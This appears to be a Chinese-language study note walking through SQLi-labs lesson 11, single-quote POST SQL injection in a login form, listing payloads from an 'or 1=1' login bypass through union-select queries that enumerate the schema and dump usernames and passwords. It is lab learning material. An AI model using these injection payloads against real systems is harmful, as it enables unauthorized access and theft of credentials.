# Less11

　　这关关于单引号报错post注入

![屏幕截图 2025-04-26 192058](assets/屏幕截图%202025-04-26%20192058-20250426193033-tkwfinf.png)

　　不能再利用hackbar进行get传参

　　可以直接在输入框进行注入

　　尝试万能密码：'or 1=1 --+

![image](assets/image-20250426193017-47997hn.png)

　　判断字段数:'or 1=1 order by 2 --+![屏幕截图 2025-04-26 193503](assets/屏幕截图%202025-04-26%20193503-20250426193549-af519pr.png)

![image](assets/image-20250426193616-64hs96r.png)

　　说明有两列

　　判断显错位:'union select 1,2 --+

![image](assets/image-20250426194249-4kogej1.png)

　　判断库名：'union select 1,database() --+

![image](assets/image-20250426194249-4kogej1.png)

　　判断表名：'union select 1,group\_concat(table\_name) from information\_schema.tables where table\_schema\='security' --+

![image](assets/image-20250426195235-f7bjkbb.png)

　　判断列名：'union select 1,group_concat(column_name) from information_schema.columns where table_name='users' --+

![image](assets/image-20250426200513-toh13uf.png)

　　爆出数据：' union select 1,group\_concat(username ,id , password) from users --+

![image](assets/image-20250426200623-ginskx2.png)

---
**使用sqlmap**

